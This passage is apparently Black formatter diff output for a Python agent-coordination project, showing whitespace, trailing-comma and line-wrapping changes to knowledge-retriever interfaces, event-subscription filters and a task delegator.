     This class represents a knowledge item returned from a query,
     along with its relevance score.
     """
-    
+
     knowledge: KnowledgeItem
     score: float
 
 
 class SimilaritySearch(abc.ABC):
     """
     Interface for similarity search.
-    
+
     Similarity search finds knowledge items similar to a query.
     """
-    
+
     @abc.abstractmethod
     async def search(self, query: str, limit: int = 10) -> List[QueryResult]:
         """
         Search for knowledge items similar to a query.
-        
+
         Args:
             query: Query string
             limit: Maximum number of results
-            
-        Returns:
-            List of query results
-        """
-        pass
-    
-    @abc.abstractmethod
-    async def search_by_vector(self, query_vector: np.ndarray, limit: int = 10) -> List[QueryResult]:
+
+        Returns:
+            List of query results
+        """
+        pass
+
+    @abc.abstractmethod
+    async def search_by_vector(
+        self, query_vector: np.ndarray, limit: int = 10
+    ) -> List[QueryResult]:
         """
         Search for knowledge items similar to a query vector.
-        
+
         Args:
             query_vector: Query vector
             limit: Maximum number of results
-            
-        Returns:
-            List of query results
-        """
-        pass
-    
-    @abc.abstractmethod
-    async def search_by_id(self, knowledge_id: str, limit: int = 10) -> List[QueryResult]:
+
+        Returns:
+            List of query results
+        """
+        pass
+
+    @abc.abstractmethod
+    async def search_by_id(
+        self, knowledge_id: str, limit: int = 10
+    ) -> List[QueryResult]:
         """
         Search for knowledge items similar to a given knowledge item.
-        
+
         Args:
             knowledge_id: ID of the knowledge item
             limit: Maximum number of results
-            
+
         Returns:
             List of query results
         """
         pass
 
 
 class MetadataFilter(abc.ABC):
     """
     Interface for metadata filters.
-    
+
     Metadata filters filter knowledge items based on their metadata.
     """
-    
+
     @abc.abstractmethod
     def matches(self, knowledge: KnowledgeItem) -> bool:
         """
         Check if a knowledge item matches the filter.
-        
+
         Args:
             knowledge: Knowledge item to check
-            
+
         Returns:
             True if the knowledge item matches the filter
         """
         pass
 
 
 class KnowledgeRetriever(abc.ABC):
     """
     Interface for knowledge retrievers.
-    
+
     Knowledge retrievers retrieve knowledge from the knowledge repository,
     including similarity search and filtering.
     """
-    
+
     @abc.abstractmethod
     async def get_knowledge(self, knowledge_id: str) -> Optional[KnowledgeItem]:
         """
         Get a knowledge item by ID.
-        
+
         Args:
             knowledge_id: ID of the knowledge item
-            
+
         Returns:
             The knowledge item, or None if not found
         """
         pass
-    
+
     @abc.abstractmethod
     async def get_knowledge_by_topic(self, topic: str) -> List[KnowledgeItem]:
         """
         Get knowledge items by topic.
-        
+
         Args:
             topic: Topic to search for
-            
+
         Returns:
             List of knowledge items with the specified topic
         """
         pass
-    
-    @abc.abstractmethod
-    async def get_knowledge_by_type(self, knowledge_type: KnowledgeType) -> List[KnowledgeItem]:
+
+    @abc.abstractmethod
+    async def get_knowledge_by_type(
+        self, knowledge_type: KnowledgeType
+    ) -> List[KnowledgeItem]:
         """
         Get knowledge items by type.
-        
+
         Args:
             knowledge_type: Type to search for
-            
+
         Returns:
             List of knowledge items with the specified type
         """
         pass
-    
+
     @abc.abstractmethod
     async def get_knowledge_by_source(self, source_id: str) -> List[KnowledgeItem]:
         """
         Get knowledge items by source.
-        
+
         Args:
             source_id: Source ID to search for
-            
+
         Returns:
             List of knowledge items from the specified source
         """
         pass
-    
+
     @abc.abstractmethod
     async def get_knowledge_by_tag(self, tag: str) -> List[KnowledgeItem]:
         """
         Get knowledge items by tag.
-        
+
         Args:
             tag: Tag to search for
-            
+
         Returns:
             List of knowledge items with the specified tag
         """
         pass
-    
+
     @abc.abstractmethod
     async def search_knowledge(self, query: str, limit: int = 10) -> List[QueryResult]:
         """
         Search for knowledge items by similarity to a query.
-        
+
         Args:
             query: Query string
             limit: Maximum number of results
-            
-        Returns:
-            List of query results
-        """
-        pass
-    
+
+        Returns:
+            List of query results
+        """
+        pass
+
     @abc.abstractmethod
     async def filter_knowledge(
-        self,
-        filter: MetadataFilter,
-        limit: Optional[int] = None
+        self, filter: MetadataFilter, limit: Optional[int] = None
     ) -> List[KnowledgeItem]:
         """
         Filter knowledge items based on metadata.
-        
+
         Args:
             filter: Metadata filter
             limit: Maximum number of results
-            
+
         Returns:
             List of knowledge items matching the filter
         """
         pass
-    
+
     @abc.abstractmethod
     async def search_and_filter(
-        self,
-        query: str,
-        filter: MetadataFilter,
-        limit: int = 10
+        self, query: str, filter: MetadataFilter, limit: int = 10
     ) -> List[QueryResult]:
         """
         Search for knowledge items and filter the results.
-        
+
         Args:
             query: Query string
             filter: Metadata filter
             limit: Maximum number of results
-            
-        Returns:
-            List of query results
-        """
-        pass
+
+        Returns:
+            List of query results
+        """
+        pass
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/knowledge_retriever.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/event_system/subscriber.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/event_system/subscriber.py	2025-06-19 04:03:50.420650+00:00
@@ -16,15 +16,29 @@
 import asyncio
 import inspect
 import logging
 import re
 from dataclasses import dataclass, field
-from typing import Any, Awaitable, Callable, Dict, List, Optional, Pattern, Set, Type, Union
+from typing import (
+    Any,
+    Awaitable,
+    Callable,
+    Dict,
+    List,
+    Optional,
+    Pattern,
+    Set,
+    Type,
+    Union,
+)
 
 from fs_agt_clean.core.monitoring import get_logger
 from fs_agt_clean.core.coordination.event_system.event import (
-    Event, EventType, EventPriority, EventStatus
+    Event,
+    EventType,
+    EventPriority,
+    EventStatus,
 )
 
 
 # Type aliases for event handlers
 EventHandler = Callable[[Event], Awaitable[None]]
@@ -55,10 +69,11 @@
 @dataclass
 class EventTypeFilter(SubscriptionFilter):
     """
     Filter events by event type.
     """
+
     event_types: Set[EventType]
 
     async def matches(self, event: Event) -> bool:
         """Check if an event matches this filter."""
         return event.event_type in self.event_types
@@ -67,10 +82,11 @@
 @dataclass
 class EventNameFilter(SubscriptionFilter):
     """
     Filter events by event name.
     """
+
     event_names: Set[str]
 
     async def matches(self, event: Event) -> bool:
         """Check if an event matches this filter."""
         return event.metadata.event_name in self.event_names
@@ -79,10 +95,11 @@
 @dataclass
 class EventSourceFilter(SubscriptionFilter):
     """
     Filter events by source.
     """
+
     sources: Set[str]
 
     async def matches(self, event: Event) -> bool:
         """Check if an event matches this filter."""
         return event.source in self.sources
@@ -91,10 +108,11 @@
 @dataclass
 class EventTargetFilter(SubscriptionFilter):
     """
     Filter events by target.
     """
+
     targets: Set[str]
 
     async def matches(self, event: Event) -> bool:
         """Check if an event matches this filter."""
         return event.metadata.target in self.targets if event.metadata.target else False
@@ -103,10 +121,11 @@
 @dataclass
 class EventPriorityFilter(SubscriptionFilter):
     """
     Filter events by priority.
     """
+
     min_priority: EventPriority
 
     async def matches(self, event: Event) -> bool:
         """Check if an event matches this filter."""
         return event.priority.value >= self.min_priority.value
@@ -115,10 +134,11 @@
 @dataclass
 class EventNamePatternFilter(SubscriptionFilter):
     """
     Filter events by event name pattern.
     """
+
     patterns: List[Pattern]
 
     def __init__(self, patterns: List[str]):
         """
         Initialize with string patterns.
@@ -139,12 +159,15 @@
 @dataclass
 class CompositeFilter(SubscriptionFilter):
     """
     Composite filter that combines multiple filters.
     """
+
     filters: List[SubscriptionFilter]
-    require_all: bool = True  # If True, all filters must match; if False, any filter can match
+    require_all: bool = (
+        True  # If True, all filters must match; if False, any filter can match
+    )
 
     async def matches(self, event: Event) -> bool:
         """Check if an event matches this filter."""
         if not self.filters:
             return True
@@ -166,10 +189,11 @@
 @dataclass
 class CustomFilter(SubscriptionFilter):
     """
     Custom filter using a predicate function.
     """
+
     predicate: EventPredicate
 
     async def matches(self, event: Event) -> bool:
         """Check if an event matches this filter."""
         return await self.predicate(event)
@@ -180,10 +204,11 @@
     """
     Represents a subscription to events.
 
     A subscription combines a filter with a handler function.
     """
+
     id: str
     filter: SubscriptionFilter
     handler: EventHandler
     subscriber_id: str
     is_active: bool = True
@@ -222,11 +247,11 @@
     async def subscribe(
         self,
         filter: SubscriptionFilter,
         handler: EventHandler,
         subscriber_id: Optional[str] = None,
-        max_concurrent: int = 1
+        max_concurrent: int = 1,
     ) -> str:
         """
         Subscribe to events matching the given filter.
 
         Args:
@@ -290,11 +315,13 @@
             SubscriptionError: If the subscription cannot be resumed
         """
         pass
 
     @abc.abstractmethod
-    async def get_subscriptions(self, subscriber_id: Optional[str] = None) -> List[Subscription]:
+    async def get_subscriptions(
+        self, subscriber_id: Optional[str] = None
+    ) -> List[Subscription]:
         """
         Get all subscriptions for a subscriber.
 
         Args:
             subscriber_id: ID of the subscriber, or None to get all subscriptions
@@ -315,11 +342,11 @@
 
     def __init__(
         self,
         message: str,
         subscription_id: Optional[str] = None,
-        cause: Optional[Exception] = None
+        cause: Optional[Exception] = None,
     ):
         """
         Initialize a subscription error.
 
         Args:
@@ -337,15 +364,11 @@
     Base implementation of the EventSubscriber interface.
 
     This class provides a foundation for event subscribers with common functionality.
     """
 
-    def __init__(
-        self,
-        subscriber_id: str,
-        logger: Optional[logging.Logger] = None
-    ):
+    def __init__(self, subscriber_id: str, logger: Optional[logging.Logger] = None):
         """
         Initialize the base event subscriber.
 
         Args:
             subscriber_id: ID of the subscriber
@@ -355,14 +378,18 @@
         self.logger = logger or get_logger(f"event_subscriber.{subscriber_id}")
         self.subscriptions: Dict[str, Subscription] = {}
 
     async def subscribe(
         self,
-        filter: Union[SubscriptionFilter, Callable[[Event], bool], Callable[[Event], Awaitable[bool]]],
+        filter: Union[
+            SubscriptionFilter,
+            Callable[[Event], bool],
+            Callable[[Event], Awaitable[bool]],
+        ],
         handler: EventHandler,
         subscriber_id: Optional[str] = None,
-        max_concurrent: int = 1
+        max_concurrent: int = 1,
     ) -> str:
         """
         Subscribe to events matching the given filter.
 
         Args:
@@ -388,20 +415,21 @@
                 actual_filter = CustomFilter(predicate=filter)
             else:
                 # Wrap non-async function in an async function
                 async def async_wrapper(event):
                     return filter(event)
+
                 actual_filter = CustomFilter(predicate=async_wrapper)
         else:
             actual_filter = filter
 
         subscription = Subscription(
             id=subscription_id,
             filter=actual_filter,
             handler=handler,
             subscriber_id=sub_id,
-            max_concurrent=max_concurrent
+            max_concurrent=max_concurrent,
         )
 
         try:
             # Delegate to implementation-specific method
             await self._register_subscription(subscription)
@@ -412,11 +440,11 @@
             self.logger.debug(
                 f"Created subscription {subscription_id} for {sub_id}",
                 extra={
                     "subscription_id": subscription_id,
                     "subscriber_id": sub_id,
-                }
+                },
             )
 
             return subscription_id
         except Exception as e:
             error_msg = f"Failed to create subscription for {sub_id}: {str(e)}"
@@ -424,11 +452,11 @@
                 error_msg,
                 extra={
                     "subscriber_id": sub_id,
                     "error": str(e),
                 },
-                exc_info=True
+                exc_info=True,
             )
             raise SubscriptionError(error_msg, cause=e)
 
     async def unsubscribe(self, subscription_id: str) -> bool:
         """
@@ -458,11 +486,11 @@
             self.logger.debug(
                 f"Removed subscription {subscription_id}",
                 extra={
                     "subscription_id": subscription_id,
                     "subscriber_id": subscription.subscriber_id,
-                }
+                },
             )
 
             return True
         except Exception as e:
             error_msg = f"Failed to remove subscription {subscription_id}: {str(e)}"
@@ -470,11 +498,11 @@
                 error_msg,
                 extra={
                     "subscription_id": subscription_id,
                     "error": str(e),
                 },
-                exc_info=True
+                exc_info=True,
             )
             raise SubscriptionError(error_msg, subscription_id=subscription_id, cause=e)
 
     async def pause_subscription(self, subscription_id: str) -> bool:
         """
@@ -505,11 +533,11 @@
             self.logger.debug(
                 f"Paused subscription {subscription_id}",
                 extra={
                     "subscription_id": subscription_id,
                     "subscriber_id": subscription.subscriber_id,
-                }
+                },
             )
 
             return True
         except Exception as e:
             error_msg = f"Failed to pause subscription {subscription_id}: {str(e)}"
@@ -517,11 +545,11 @@
                 error_msg,
                 extra={
                     "subscription_id": subscription_id,
                     "error": str(e),
                 },
-                exc_info=True
+                exc_info=True,
             )
             raise SubscriptionError(error_msg, subscription_id=subscription_id, cause=e)
 
     async def resume_subscription(self, subscription_id: str) -> bool:
         """
@@ -552,11 +580,11 @@
             self.logger.debug(
                 f"Resumed subscription {subscription_id}",
                 extra={
                     "subscription_id": subscription_id,
                     "subscriber_id": subscription.subscriber_id,
-                }
+                },
             )
 
             return True
         except Exception as e:
             error_msg = f"Failed to resume subscription {subscription_id}: {str(e)}"
@@ -564,15 +592,17 @@
                 error_msg,
                 extra={
                     "subscription_id": subscription_id,
                     "error": str(e),
                 },
-                exc_info=True
+                exc_info=True,
             )
             raise SubscriptionError(error_msg, subscription_id=subscription_id, cause=e)
 
-    async def get_subscriptions(self, subscriber_id: Optional[str] = None) -> List[Subscription]:
+    async def get_subscriptions(
+        self, subscriber_id: Optional[str] = None
+    ) -> List[Subscription]:
         """
         Get all subscriptions for a subscriber.
 
         Args:
             subscriber_id: ID of the subscriber, or None to get all subscriptions
@@ -585,11 +615,12 @@
         """
         if subscriber_id is None:
             return list(self.subscriptions.values())
 
         return [
-            subscription for subscription in self.subscriptions.values()
+            subscription
+            for subscription in self.subscriptions.values()
             if subscription.subscriber_id == subscriber_id
         ]
 
     @abc.abstractmethod
     async def _register_subscription(self, subscription: Subscription) -> None:
@@ -628,11 +659,11 @@
 
     def __init__(
         self,
         subscriber_id: str,
         event_bus: Any,  # Will be EventBus once defined
-        logger: Optional[logging.Logger] = None
+        logger: Optional[logging.Logger] = None,
     ):
         """
         Initialize the in-memory event subscriber.
 
         Args:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/event_system/subscriber.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/coordinator/task_delegator.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/coordinator/task_delegator.py	2025-06-19 04:03:50.446087+00:00
@@ -13,22 +13,33 @@
 from datetime import datetime, timedelta
 from typing import Any, Dict, List, Optional, Set, Tuple, Type, Union
 
 from fs_agt_clean.core.monitoring import get_logger
 from fs_agt_clean.core.coordination.event_system import (
-    Event, EventType, EventPriority, create_publisher, create_subscriber,
-    EventTypeFilter, EventNameFilter, CompositeFilter
+    Event,
+    EventType,
+    EventPriority,
+    create_publisher,
+    create_subscriber,
+    EventTypeFilter,
+    EventNameFilter,
+    CompositeFilter,
 )
 from fs_agt_clean.core.coordination.coordinator.coordinator import (
-    AgentInfo, AgentStatus, AgentType, AgentCapability, CoordinationError
+    AgentInfo,
+    AgentStatus,
+    AgentType,
+    AgentCapability,
+    CoordinationError,
 )
 
 
 class TaskStatus(enum.Enum):
     """
     Status of a task in the system.
     """
+
     CREATED = "created"
     ASSIGNED = "assigned"
     ACCEPTED = "accepted"
     PROCESSING = "processing"
     COMPLETED = "completed"
@@ -41,10 +52,11 @@
     """
     Priority of a task in the system.
 
     Higher values indicate higher priority.
     """
+
     LOW = 0
     NORMAL = 50
     HIGH = 100
     CRITICAL = 200
 
@@ -64,11 +76,11 @@
         parameters: Dict[str, Any],
         agent_id: Optional[str] = None,
         parent_task_id: Optional[str] = None,
         priority: TaskPriority = TaskPriority.NORMAL,
         deadline: Optional[datetime] = None,
-        metadata: Dict[str, Any] = None
+        metadata: Dict[str, Any] = None,
     ):
         """
         Initialize a task.
 
         Args:
@@ -133,27 +145,33 @@
             "metadata": self.metadata,
             "status": self.status.value,
             "created_at": self.created_at.isoformat(),
             "assigned_at": self.assigned_at.isoformat() if self.assigned_at else None,
             "accepted_at": self.accepted_at.isoformat() if self.accepted_at else None,
-            "processing_at": self.processing_at.isoformat() if self.processing_at else None,
-            "completed_at": self.completed_at.isoformat() if self.completed_at else None,
+            "processing_at": (
+                self.processing_at.isoformat() if self.processing_at else None
+            ),
+            "completed_at": (
+                self.completed_at.isoformat() if self.completed_at else None
+            ),
             "failed_at": self.failed_at.isoformat() if self.failed_at else None,
-            "cancelled_at": self.cancelled_at.isoformat() if self.cancelled_at else None,
+            "cancelled_at": (
+                self.cancelled_at.isoformat() if self.cancelled_at else None
+            ),
             "result": self.result,
             "error": self.error,
             "subtasks": self.subtasks,
             "completed_subtasks": self.completed_subtasks,
             "battery_intensive": self.battery_intensive,
             "network_intensive": self.network_intensive,
             "storage_intensive": self.storage_intensive,
             "cpu_intensive": self.cpu_intensive,
-            "memory_intensive": self.memory_intensive
+            "memory_intensive": self.memory_intensive,
         }
 
     @classmethod
-    def from_dict(cls, data: Dict[str, Any]) -> 'Task':
+    def from_dict(cls, data: Dict[str, Any]) -> "Task":
         """
         Create a task from a dictionary.
 
         Args:
             data: Dictionary containing task data
@@ -172,11 +190,11 @@
             parameters=data["parameters"],
             agent_id=data.get("agent_id"),
             parent_task_id=data.get("parent_task_id"),
             priority=TaskPriority(data.get("priority", TaskPriority.NORMAL.value)),
             deadline=deadline,
-            metadata=data.get("metadata", {})
+            metadata=data.get("metadata", {}),
         )
 
         # Set task lifecycle information
         task.status = TaskStatus(data.get("status", TaskStatus.CREATED.value))
         task.created_at = datetime.fromisoformat(data["created_at"])
@@ -297,11 +315,11 @@
         """
         return self.status in (
             TaskStatus.CREATED,
             TaskStatus.ASSIGNED,
             TaskStatus.ACCEPTED,
-            TaskStatus.PROCESSING
+            TaskStatus.PROCESSING,
         )
 
     def is_overdue(self) -> bool:
         """
         Check if the task is overdue.
@@ -319,11 +337,13 @@
         Check if all subtasks are completed.
 
         Returns:
             True if all subtasks are completed
         """
-        return len(self.subtasks) > 0 and len(self.subtasks) == len(self.completed_subtasks)
+        return len(self.subtasks) > 0 and len(self.subtasks) == len(
+            self.completed_subtasks
+        )
 
     def __str__(self) -> str:
         """
         Get string representation of the task.
 
@@ -351,12 +371,16 @@
         """
         self.delegator_id = delegator_id
         self.logger = get_logger(f"coordinator.delegator.{delegator_id}")
 
         # Create publisher and subscriber for event-based communication
-        self.publisher = create_publisher(source_id=f"coordinator.delegator.{delegator_id}")
-        self.subscriber = create_subscriber(subscriber_id=f"coordinator.delegator.{delegator_id}")
+        self.publisher = create_publisher(
+            source_id=f"coordinator.delegator.{delegator_id}"
+        )
+        self.subscriber = create_subscriber(
+            subscriber_id=f"coordinator.delegator.{delegator_id}"
+        )
 
         # Initialize task registry
         self.tasks: Dict[str, Task] = {}
 
         # Initialize task dependency graph
@@ -420,11 +444,11 @@
         parameters: Dict[str, Any],
         agent_id: Optional[str] = None,
         parent_task_id: Optional[str] = None,
         priority: TaskPriority = TaskPriority.NORMAL,
         deadline: Optional[datetime] = None,
-        metadata: Dict[str, Any] = None
+        metadata: Dict[str, Any] = None,
     ) -> str:
         """
         Create a new task.
 
         Args:
@@ -453,11 +477,11 @@
                 parameters=parameters,
                 agent_id=agent_id,
                 parent_task_id=parent_task_id,
                 priority=priority,
                 deadline=deadline,
-                metadata=metadata
+                metadata=metadata,
             )
 
             # Store the task
             async with self.task_lock:
                 self.tasks[task_id] = task
@@ -485,15 +509,11 @@
         except Exception as e:
             error_msg = f"Failed to create task: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, cause=e)
 
-    async def assign_task(
-        self,
-        task_id: str,
-        agent_id: str
-    ) -> bool:
+    async def assign_task(self, task_id: str, agent_id: str) -> bool:
         """
         Assign a task to an agent.
 
         Args:
             task_id: ID of the task
@@ -534,15 +554,11 @@
             error_msg = f"Failed to assign task {task_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, task_id=task_id, cause=e)
 
     async def update_task_status(
-        self,
-        task_id: str,
-        status: TaskStatus,
-        result: Any = None,
-        error: str = None
+        self, task_id: str, status: TaskStatus, result: Any = None, error: str = None
     ) -> bool:
         """
         Update a task's status.
 
         Args:
@@ -585,11 +601,14 @@
                 f"Task status updated: {task_id} {old_status.value} -> {status.value}"
             )
 
             # If the task is completed or failed, check if it has a parent task
             # and update the parent task if all subtasks are completed
-            if status in (TaskStatus.COMPLETED, TaskStatus.FAILED) and task.parent_task_id:
+            if (
+                status in (TaskStatus.COMPLETED, TaskStatus.FAILED)
+                and task.parent_task_id
+            ):
                 await self._check_parent_task_completion(task.parent_task_id)
 
             return True
         except Exception as e:
             error_msg = f"Failed to update task status {task_id}: {str(e)}"
@@ -616,11 +635,15 @@
                     return False
 
                 task = self.tasks[task_id]
 
                 # Only cancel tasks that are not completed, failed, or already cancelled
-                if task.status in (TaskStatus.COMPLETED, TaskStatus.FAILED, TaskStatus.CANCELLED):
+                if task.status in (
+                    TaskStatus.COMPLETED,
+                    TaskStatus.FAILED,
+                    TaskStatus.CANCELLED,
+                ):
                     self.logger.warning(
                         f"Cannot cancel task {task_id} with status {task.status.value}"
                     )
                     return False
 
@@ -661,13 +684,11 @@
             error_msg = f"Failed to get task {task_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, task_id=task_id, cause=e)
 
     async def get_agent_tasks(
-        self,
-        agent_id: str,
-        status: Optional[TaskStatus] = None
+        self, agent_id: str, status: Optional[TaskStatus] = None
     ) -> List[Task]:
         """
         Get tasks assigned to an agent.
 
         Args:
@@ -682,16 +703,18 @@
         """
         try:
             async with self.task_lock:
                 if status:
                     return [
-                        task for task in self.tasks.values()
+                        task
+                        for task in self.tasks.values()
                         if task.agent_id == agent_id and task.status == status
                     ]
                 else:
                     return [
-                        task for task in self.tasks.values()
+                        task
+                        for task in self.tasks.values()
                         if task.agent_id == agent_id
                     ]
         except Exception as e:
             error_msg = f"Failed to get agent tasks {agent_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
@@ -726,13 +749,11 @@
             error_msg = f"Failed to get subtasks {task_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, task_id=task_id, cause=e)
 
     async def decompose_task(
-        self,
-        task_id: str,
-        subtask_definitions: List[Dict[str, Any]]
+        self, task_id: str, subtask_definitions: List[Dict[str, Any]]
     ) -> List[str]:
         """
         Decompose a task into subtasks.
 
         Args:
@@ -748,12 +769,11 @@
         try:
             # Check if the parent task exists
             parent_task = await self.get_task(task_id)
             if not parent_task:
                 raise CoordinationError(
-                    f"Parent task not found: {task_id}",
-                    task_id=task_id
+                    f"Parent task not found: {task_id}", task_id=task_id
                 )
 
             # Create subtasks
             subtask_ids = []
             for subtask_def in subtask_definitions:
@@ -762,11 +782,11 @@
                     parameters=subtask_def["parameters"],
                     agent_id=subtask_def.get("agent_id"),
                     parent_task_id=task_id,
                     priority=subtask_def.get("priority", parent_task.priority),
                     deadline=subtask_def.get("deadline"),
-                    metadata=subtask_def.get("metadata")
+                    metadata=subtask_def.get("metadata"),
                 )
                 subtask_ids.append(subtask_id)
 
             self.logger.info(
                 f"Task decomposed: {task_id} into {len(subtask_ids)} subtasks"
@@ -802,11 +822,13 @@
                 # Get all subtasks
                 subtasks = await self.get_subtasks(parent_task_id)
 
                 # Check if all subtasks are completed or failed
                 all_completed = all(
-                    subtask.is_complete() or subtask.is_failed() or subtask.is_cancelled()
+                    subtask.is_complete()
+                    or subtask.is_failed()
+                    or subtask.is_cancelled()
                     for subtask in subtasks
                 )
 
                 if all_completed:
                     # Check if any subtasks failed
@@ -815,11 +837,11 @@
                     if any_failed:
                         # If any subtasks failed, mark the parent task as failed
                         await self.update_task_status(
                             parent_task_id,
                             TaskStatus.FAILED,
-                            error="One or more subtasks failed"
+                            error="One or more subtasks failed",
                         )
                     else:
                         # If all subtasks completed successfully, mark the parent task as completed
                         # Aggregate results from subtasks
                         results = {
@@ -827,18 +849,16 @@
                             for subtask in subtasks
                             if subtask.is_complete()
                         }
 
                         await self.update_task_status(
-                            parent_task_id,
-                            TaskStatus.COMPLETED,
-                            result=results
+                            parent_task_id, TaskStatus.COMPLETED, result=results
                         )
         except Exception as e:
             self.logger.error(
                 f"Error checking parent task completion {parent_task_id}: {str(e)}",
-                exc_info=True
+                exc_info=True,
             )
 
     async def _cancel_subtasks(self, parent_task_id: str) -> None:
         """
         Cancel all subtasks of a parent task.
@@ -854,11 +874,11 @@
             for subtask in subtasks:
                 await self.cancel_task(subtask.task_id)
         except Exception as e:
             self.logger.error(
                 f"Error cancelling subtasks of {parent_task_id}: {str(e)}",
-                exc_info=True
+                exc_info=True,
             )
 
     async def _task_monitor_loop(self) -> None:
         """
         Periodic task monitoring loop.
@@ -872,12 +892,11 @@
 
                 try:
                     # Get all active tasks
                     async with self.task_lock:
                         active_tasks = [
-                            task for task in self.tasks.values()
-                            if task.is_active()
+                            task for task in self.tasks.values() if task.is_active()
                         ]
 
                     # Check each task for overdue deadline
                     for task in active_tasks:
                         try:
@@ -886,19 +905,21 @@
                                     f"Task {task.task_id} is overdue, marking as timeout"
                                 )
                                 await self.update_task_status(
                                     task.task_id,
                                     TaskStatus.TIMEOUT,
-                                    error="Task exceeded deadline"
+                                    error="Task exceeded deadline",
                                 )
                         except Exception as e:
                             self.logger.error(
                                 f"Error checking task {task.task_id}: {str(e)}",
-                                exc_info=True
+                                exc_info=True,
                             )
                 except Exception as e:
-                    self.logger.error(f"Error in task monitor loop: {str(e)}", exc_info=True)
+                    self.logger.error(
+                        f"Error in task monitor loop: {str(e)}", exc_info=True
+                    )
 
                 # Wait for the next monitoring interval
                 await asyncio.sleep(self.task_monitor_interval.total_seconds())
         except asyncio.CancelledError:
             # Task was cancelled, exit gracefully
@@ -914,25 +935,25 @@
         task completion, and other task-related events.
         """
         # Subscribe to task status update events
         subscription_id = await self.subscriber.subscribe(
             filter=EventNameFilter(event_names={"task_status_update"}),
-            handler=self._handle_task_status_update
+            handler=self._handle_task_status_update,
         )
         self.subscription_ids.append(subscription_id)
 
         # Subscribe to task completion events
         subscription_id = await self.subscriber.subscribe(
             filter=EventNameFilter(event_names={"task_completed"}),
-            handler=self._handle_task_completed
+            handler=self._handle_task_completed,
         )
         self.subscription_ids.append(subscription_id)
 
         # Subscribe to task failure events
         subscription_id = await self.subscriber.subscribe(
             filter=EventNameFilter(event_names={"task_failed"}),
-            handler=self._handle_task_failed
+            handler=self._handle_task_failed,
         )
         self.subscription_ids.append(subscription_id)
 
     async def _handle_task_status_update(self, event: Event) -> None:
         """
@@ -945,11 +966,13 @@
             # Extract task ID and status from the event
             task_id = event.data.get("task_id")
             status_str = event.data.get("status")
 
             if not task_id or not status_str:
-                self.logger.warning("Received task status update event with missing data")
+                self.logger.warning(
+                    "Received task status update event with missing data"
+                )
                 return
 
             # Convert status string to enum
             try:
                 status = TaskStatus(status_str)
@@ -960,14 +983,16 @@
             # Update the task status
             await self.update_task_status(
                 task_id,
                 status,
                 result=event.data.get("result"),
-                error=event.data.get("error")
+                error=event.data.get("error"),
             )
         except Exception as e:
-            self.logger.error(f"Error handling task status update: {str(e)}", exc_info=True)
+            self.logger.error(
+                f"Error handling task status update: {str(e)}", exc_info=True
+            )
 
     async def _handle_task_completed(self, event: Event) -> None:
         """
         Handle a task completion event.
 
@@ -982,17 +1007,15 @@
             if not task_id:
                 self.logger.warning("Received task completion event without task_id")
                 return
 
             # Update the task status
-            await self.update_task_status(
-                task_id,
-                TaskStatus.COMPLETED,
-                result=result
+            await self.update_task_status(task_id, TaskStatus.COMPLETED, result=result)
+        except Exception as e:
+            self.logger.error(
+                f"Error handling task completion: {str(e)}", exc_info=True
             )
-        except Exception as e:
-            self.logger.error(f"Error handling task completion: {str(e)}", exc_info=True)
 
     async def _handle_task_failed(self, event: Event) -> None:
         """
         Handle a task failure event.
 
@@ -1007,15 +1030,11 @@
             if not task_id:
                 self.logger.warning("Received task failure event without task_id")
                 return
 
             # Update the task status
-            await self.update_task_status(
-                task_id,
-                TaskStatus.FAILED,
-                error=error
-            )
+            await self.update_task_status(task_id, TaskStatus.FAILED, error=error)
         except Exception as e:
             self.logger.error(f"Error handling task failure: {str(e)}", exc_info=True)
 
     async def _publish_task_created_event(self, task: Task) -> None:
         """
@@ -1030,12 +1049,12 @@
                 "task_id": task.task_id,
                 "task_type": task.task_type,
                 "agent_id": task.agent_id,
                 "parent_task_id": task.parent_task_id,
                 "priority": task.priority.value,
-                "deadline": task.deadline.isoformat() if task.deadline else None
-            }
+                "deadline": task.deadline.isoformat() if task.deadline else None,
+            },
         )
 
     async def _publish_task_assignment_event(self, task: Task) -> None:
         """
         Publish a task assignment event.
@@ -1048,13 +1067,13 @@
             parameters={
                 "task_id": task.task_id,
                 "task_type": task.task_type,
                 "parameters": task.parameters,
                 "priority": task.priority.value,
-                "deadline": task.deadline.isoformat() if task.deadline else None
+                "deadline": task.deadline.isoformat() if task.deadline else None,
             },
-            target=task.agent_id
+            target=task.agent_id,
         )
 
     async def _publish_task_result_event(self, task: Task, result: Any) -> None:
         """
         Publish a task result event.
@@ -1063,15 +1082,11 @@
             task: The task with the result
             result: The task result
         """
         await self.publisher.publish_notification(
             notification_name="task_result",
-            data={
-                "task_id": task.task_id,
-                "agent_id": task.agent_id,
-                "result": result
-            }
+            data={"task_id": task.task_id, "agent_id": task.agent_id, "result": result},
         )
 
     async def _publish_task_status_event(self, task: Task) -> None:
         """
         Publish a task status update event.
@@ -1084,12 +1099,12 @@
             data={
                 "task_id": task.task_id,
                 "status": task.status.value,
                 "agent_id": task.agent_id,
                 "result": task.result if task.is_complete() else None,
-                "error": task.error if task.is_failed() else None
-            }
+                "error": task.error if task.is_failed() else None,
+            },
         )
 
     async def _publish_task_cancellation_event(self, task: Task) -> None:
         """
         Publish a task cancellation event.
@@ -1097,10 +1112,8 @@
         Args:
             task: The cancelled task
         """
         await self.publisher.publish_command(
             command_name="cancel_task",
-            parameters={
-                "task_id": task.task_id
-            },
-            target=task.agent_id
-        )
+            parameters={"task_id": task.task_id},
+            target=task.agent_id,
+        )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/coordinator/task_delegator.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/knowledge_subscriber.py	2025-06-14 20:35:30.787733+00:00
